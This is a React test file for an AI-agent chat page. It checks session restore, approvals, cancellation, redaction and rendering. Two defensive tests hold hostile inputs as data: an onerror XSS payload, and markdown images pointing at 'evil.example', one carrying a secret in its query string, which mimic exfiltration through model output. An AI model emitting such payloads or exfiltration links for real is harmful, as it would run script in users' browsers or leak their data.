import { describe, it, expect, vi, beforeEach } from 'vitest'
import { act, fireEvent, render, screen, waitFor, within } from '@testing-library/react'
import type { KernelEvent } from '@mffai/protocol'
import ChatPage from './ChatPage'
import { ChatHtmlCtx } from '../../views/chat/markdown'
import { route } from '../route'
import { installFakeForge, type CallTable, type FakeForge } from '../test/fakeForge'
import { ev, redacted, resetSeq } from '../test/events'
import { runRow, summary } from '../test/sessions'

const S = 's1'
let f: FakeForge
const e = (type: Parameters<typeof ev>[0], payload: unknown) => ev(type, payload, { sessionId: S })

/** 挂起的一轮:用户的话、一条助手回复、一个待批的审批、一个还在跑的委派运行 */
function parkedTurn(): KernelEvent[] {
  return [
    e('message.user', { turnId: 't1', text: 'fix the build' }),
    e('turn.snapshot', { turnId: 't1', phase: 'start', ref: 'refs/start' }),
    e('message.assistant', { turnId: 't1', step: 1, text: 'delegating now' }),
    e('executor.run.queued', { runId: 'r1', turnId: 't1', callId: 'c1', executor: 'codex', summary: 'do it', readOnly: false, isolation: 'own', position: 1 }),
    e('executor.run.started', { runId: 'r1', turnId: 't1', executor: 'codex', cwd: '/repo', isolation: 'own' }),
    ...Array.from({ length: 30 }, (_, i) => e('executor.run.progress', { runId: 'r1', turnId: 't1', kind: 'tool', text: `step ${i}` })),
    e('approval.requested', { approvalId: 'p1', turnId: 't1', callId: 'c2', tool: 'shell', summary: 'npm test' }),
    e('turn.parked', { turnId: 't1', step: 1, active: 1, pending: 0 }),
  ]
}

function setup(calls: CallTable = {}, sessionPatch = {}) {
  const events = parkedTurn()
  f = installFakeForge({ calls: {
    'session.list': { sessions: [summary(S, { title: '会话', open: { turnId: 't1', parked: true }, pendingApprovals: 1, ...sessionPatch })] },
    'session.state': { session: summary(S, sessionPatch), events, hasMore: false, lastSeq: events.at(-1)!.seq, open: { turnId: 't1', parked: true, approvalIds: ['p1'] } },
    'plugins.commands': { commands: [] },
    'session.prompt': { accepted: true, turnId: 't1', followUp: true },
    'session.cancel': { ok: true },
    'executor.cancel': { ok: true },
    'channel.telegram.chats': { chats: [], worktrees: [] },
    ...calls,
  } })
}

const composer = () => document.querySelector('.mffai-composer') as HTMLElement
const card = (runId: string) => document.querySelector(`[data-run="${runId}"]`) as HTMLElement

beforeEach(() => { resetSeq(); route.set({ page: 'chat', sessionId: S }) })

describe('SessionPane (through ChatPage)', () => {
  it('reopen restores the approval card, the run card 停止, 挂起 and the turn-level 停止; sending is a followUp to the same session', async () => {
    setup()
    const check = async () => {
      await screen.findByText('npm test')
      expect(screen.getByText('fix the build')).toBeInTheDocument()
      expect(within(card('r1')).getByRole('button', { name: '停止' })).toBeInTheDocument()
      expect(within(composer()).getByText('挂起 · 1 运行中')).toBeInTheDocument()
      expect(within(composer()).getByRole('button', { name: '停止' })).toBeInTheDocument()
      expect(screen.getByRole('button', { name: '允许' })).toBeInTheDocument()
    }
    const first = render(<ChatPage />)
    await check()
    first.unmount()
    render(<ChatPage />)
    await check()
    fireEvent.change(screen.getByRole('textbox', { name: '输入' }), { target: { value: 'also lint' } })
    await act(async () => { fireEvent.keyDown(screen.getByRole('textbox', { name: '输入' }), { key: 'Enter' }) })
    expect(f.callsOf('session.prompt')).toEqual([{ commandId: expect.any(String), sessionId: S, text: 'also lint' }])
    expect(document.querySelector('.mffai-fail')).toBeNull()
    expect((screen.getByRole('textbox', { name: '输入' }) as HTMLTextAreaElement).value).toBe('')
    // 停止:轮级的走 session.cancel,运行卡片上的走 executor.cancel,只停那一个
    await act(async () => { fireEvent.click(within(composer()).getByRole('button', { name: '停止' })) })
    await act(async () => { fireEvent.click(within(card('r1')).getByRole('button', { name: '停止' })) })
    expect(f.callsOf('session.cancel')).toEqual([{ commandId: expect.any(String), sessionId: S }])
    expect(f.callsOf('executor.cancel')).toEqual([{ commandId: expect.any(String), sessionId: S, runId: 'r1' }])
  })

  it('live events stream in; the terminal event drops the stop buttons', async () => {
    setup()
    render(<ChatPage />)
    await screen.findByText('npm test')
    act(() => {
      f.emit(e('approval.resolved', { approvalId: 'p1', decision: 'allow', by: 'user', via: 'telegram:9' }))
      f.emit(e('turn.resumed', { turnId: 't1', step: 1, cause: 'notice' }))
      f.emit(e('executor.run.ended', { runId: 'r1', turnId: 't1', executor: 'codex', status: 'ok', ms: 10, changed: { files: [], source: 'none' } }))
      f.emit(e('message.assistant.delta', { turnId: 't1', step: 2, text: 'all green' }))
    })
    expect(screen.getByText('已允许 · Telegram')).toBeInTheDocument()
    expect(screen.getByText('all green')).toBeInTheDocument()
    expect(within(composer()).queryByText(/挂起/)).toBeNull()
    act(() => f.emit(e('turn.ended', { turnId: 't1' })))
    expect(within(composer()).queryByRole('button', { name: '停止' })).toBeNull()
    expect(within(card('r1')).queryByRole('button', { name: '停止' })).toBeNull()
  })

  it('a reset alert refetches session.state and shows each message once', async () => {
    setup()
    render(<ChatPage />)
    await screen.findByText('npm test')
    await act(async () => { f.alert({ kind: 'reset' } as never) })
    await waitFor(() => expect(f.callsOf('session.state')).toHaveLength(2))
    expect(screen.getAllByText('fix the build')).toHaveLength(1)
    expect(screen.getAllByText('npm test')).toHaveLength(1)
  })

  it('redaction reaches the screen: a cached seq redacted, refetched, the marker is gone', async () => {
    const marker = 'MARKER_7f3a'
    const u = e('message.user', { turnId: 't1', text: `say ${marker}` })
    const done = e('turn.ended', { turnId: 't1' })
    const state = (text: string) => ({ session: summary(S), events: [{ ...u, payload: { turnId: 't1', text } }, done], hasMore: false, lastSeq: done.seq })
    f = installFakeForge({ calls: { 'session.list': { sessions: [summary(S)] }, 'session.state': state(`say ${marker}`), 'plugins.commands': { commands: [] } } })
    render(<ChatPage />)
    await screen.findByText(`say ${marker}`)
    f.script({ 'session.state': state('[已删除]') })
    await act(async () => { f.emit(redacted({ seqs: [u.seq] })) })
    await screen.findByText('[已删除]')
    expect(document.body.innerHTML).not.toContain(marker)
  })

  it('model text is never parsed as HTML, even when the app turns inline HTML on', async () => {
    const evs = [e('message.user', { turnId: 't1', text: 'hi' }), e('message.assistant', { turnId: 't1', step: 1, text: 'x <span style="color:red">red</span> <img src=x onerror=alert(1)>' }), e('turn.ended', { turnId: 't1' })]
    f = installFakeForge({ calls: { 'session.list': { sessions: [summary(S)] }, 'session.state': { session: summary(S), events: evs, hasMore: false, lastSeq: evs.at(-1)!.seq }, 'plugins.commands': { commands: [] } } })
    render(<ChatHtmlCtx.Provider value={true}><ChatPage /></ChatHtmlCtx.Provider>)
    await screen.findByText(/onerror/)
    const body = document.querySelector('.mffai-chat-body')!
    expect(body.querySelector('img')).toBeNull()
    expect(body.querySelector('span[style]')).toBeNull()
  })

  it('no remote image loads in the mff-ai pane, whatever the markdown shape; remote ones become links with the alt and the host', async () => {
    const PNG = 'data:image/png;base64,iVBORw0KGgo='
    const text = [
      '~~~', 'x', '~~~', '![tilde](https://evil.example/tilde.png?d=SECRET2)', '',
      '![ref][r]', '', '[r]: https://evil.example/ref.png', '',
      '<img src="https://evil.example/html.png">', '',
      '![proto](//evil.example/proto.png)', '',
      '![svg](data:image/svg+xml;base64,PHN2Zz4=)', '',
      `![ok](${PNG})`, '',
      '[docs](https://good.example/a) and [https://same.example/](https://same.example/)', '',
      // 信息串带反引号:渲染器不当它是围栏,图照画;收尾那行 ``` 又开了一个没闭合的围栏,所以放最后
      '```js`x', '![tick](https://evil.example/tick.png)', '```',
    ].join('\n')
    const evs = [e('message.user', { turnId: 't1', text: 'hi' }), e('message.assistant', { turnId: 't1', step: 1, text }), e('turn.ended', { turnId: 't1' })]
    f = installFakeForge({ calls: { 'session.list': { sessions: [summary(S)] }, 'session.state': { session: summary(S), events: evs, hasMore: false, lastSeq: evs.at(-1)!.seq }, 'plugins.commands': { commands: [] } } })
    ;(f.forge as { imageFile?: unknown }).imageFile = vi.fn(async () => ({ dataUrl: PNG }))
    render(<ChatHtmlCtx.Provider value={true}><ChatPage /></ChatHtmlCtx.Provider>)
    await screen.findByText('tilde')
    const body = document.querySelector('.mffai-chat-body')!
    const srcs = [...body.querySelectorAll('img')].map((i) => i.getAttribute('src'))
    expect(srcs).toEqual([PNG])
    expect(body.innerHTML).not.toMatch(/<img[^>]+(https?:)?\/\/evil/)
    const link = (t: string) => [...body.querySelectorAll('a.md-link')].find((a) => a.textContent === t) as HTMLAnchorElement
    expect(link('tilde').getAttribute('href')).toBe('https://evil.example/tilde.png?d=SECRET2')
    expect(link('tilde').closest('.md-link-wrap')!.querySelector('.md-link-host')!.textContent).toBe('evil.example')
    expect(link('proto')).toBeTruthy()
    expect(link('tick')).toBeTruthy()
    expect(link('docs').closest('.md-link-wrap')!.querySelector('.md-link-host')!.textContent).toBe('good.example')
    expect(link('https://same.example/').closest('.md-link-wrap')!.querySelector('.md-link-host')).toBeNull()
  })

  it('route.runId scrolls to that run card', async () => {
    setup()
    const spy = vi.fn()
    Element.prototype.scrollIntoView = spy
    route.set({ page: 'chat', sessionId: S, runId: 'r1' })
    render(<ChatPage />)
    await screen.findByText('npm test')
    await waitFor(() => expect(spy).toHaveBeenCalled())
    expect(spy.mock.contexts[0]).toBe(card('r1'))
    delete (Element.prototype as { scrollIntoView?: unknown }).scrollIntoView
  })

  it('更早 pages back with session.events', async () => {
    setup({ 'session.events': { events: [ev('message.user', { turnId: 't0', text: 'way back' }, { sessionId: S, seq: 1 })], hasMore: false } })
    const evs = parkedTurn()
    f.script({ 'session.state': { session: summary(S), events: evs, hasMore: true, lastSeq: evs.at(-1)!.seq, open: { turnId: 't1', parked: true, approvalIds: ['p1'] } } })
    render(<ChatPage />)
    await screen.findByText('npm test')
    await act(async () => { fireEvent.click(screen.getByRole('button', { name: '更早' })) })
    expect(f.callsOf('session.events')).toEqual([{ sessionId: S, beforeSeq: evs[0].seq, limit: 300 }])
    expect(screen.getByText('way back')).toBeInTheDocument()
    expect(screen.queryByRole('button', { name: '更早' })).toBeNull()
  })

  it('an IM session: cards still answerable, no textarea; user lines carry Telegram', async () => {
    setup({ 'approval.respond': { ok: true } }, { origin: 'im' })
    render(<ChatPage />)
    await screen.findByText('npm test')
    expect(screen.queryByRole('textbox', { name: '输入' })).toBeNull()
    expect(document.querySelector('.msg-via')?.textContent).toBe('Telegram')
    await act(async () => { fireEvent.click(screen.getByRole('button', { name: '允许' })) })
    expect(f.callsOf('approval.respond')).toEqual([{ approvalId: 'p1', decision: 'allow' }])
  })

  it('reopened run cards ask executor.runs for the worktree state: a gone worktree offers no 丢弃', async () => {
    const evs = [
      e('message.user', { turnId: 't1', text: 'hi' }),
      e('executor.run.started', { runId: 'r1', turnId: 't1', executor: 'codex', cwd: '/repo', isolation: 'own', worktree: '/wt/r1' }),
      e('executor.run.ended', { runId: 'r1', turnId: 't1', executor: 'codex', status: 'ok', ms: 1, changed: { files: ['a'], source: 'git' }, worktree: '/wt/r1' }),
      e('turn.ended', { turnId: 't1' }),
    ]
    f = installFakeForge({ calls: {
      'session.list': { sessions: [summary(S)] }, 'plugins.commands': { commands: [] },
      'session.state': { session: summary(S), events: evs, hasMore: false, lastSeq: evs.at(-1)!.seq },
      'executor.runs': { runs: [runRow('r1', S, { worktree: { path: '/wt/r1', present: false } })] },
    } })
    render(<ChatPage />)
    await waitFor(() => expect(f.callsOf('executor.runs')).toHaveLength(1))
    await waitFor(() => expect(within(card('r1')).queryByRole('button', { name: '丢弃' })).toBeNull())
    expect(within(card('r1')).queryByRole('button', { name: '合并' })).toBeNull()
  })

  it('the rollback button sits on the newest snapshotted turn only, once nothing is open', async () => {
    const snap = (id: string) => [e('turn.snapshot', { turnId: id, phase: 'start', ref: `${id}-s` }), e('turn.snapshot', { turnId: id, phase: 'end', ref: `${id}-e`, changed: 1 })]
    const evs = [
      e('message.user', { turnId: 't1', text: 'one' }), ...snap('t1'), e('turn.ended', { turnId: 't1' }),
      e('message.user', { turnId: 't2', text: 'two' }), ...snap('t2'), e('turn.ended', { turnId: 't2' }),
    ]
    f = installFakeForge({ calls: { 'session.list': { sessions: [summary(S)] }, 'plugins.commands': { commands: [] }, 'session.state': { session: summary(S), events: evs, hasMore: false, lastSeq: evs.at(-1)!.seq } } })
    render(<ChatPage />)
    await screen.findByText('two')
    const buttons = screen.getAllByRole('button', { name: '回滚本轮' })
    expect(buttons).toHaveLength(1)
    expect(buttons[0].closest('.mffai-tail')!.getAttribute('data-turn')).toBe('t2')
    act(() => f.emit(e('message.user', { turnId: 't3', text: 'three' })))
    expect(screen.queryByRole('button', { name: '回滚本轮' })).toBeNull()
  })

  it('an unknown session: 已删除 and the input is disabled', async () => {
    f = installFakeForge({ calls: { 'session.list': { sessions: [summary(S)] }, 'plugins.commands': { commands: [] }, 'session.state': () => { throw { code: -32602, message: 'unknown session' } } } })
    render(<ChatPage />)
    await screen.findByText('已删除')
    expect((screen.getByRole('textbox', { name: '输入' }) as HTMLTextAreaElement).disabled).toBe(true)
  })
})
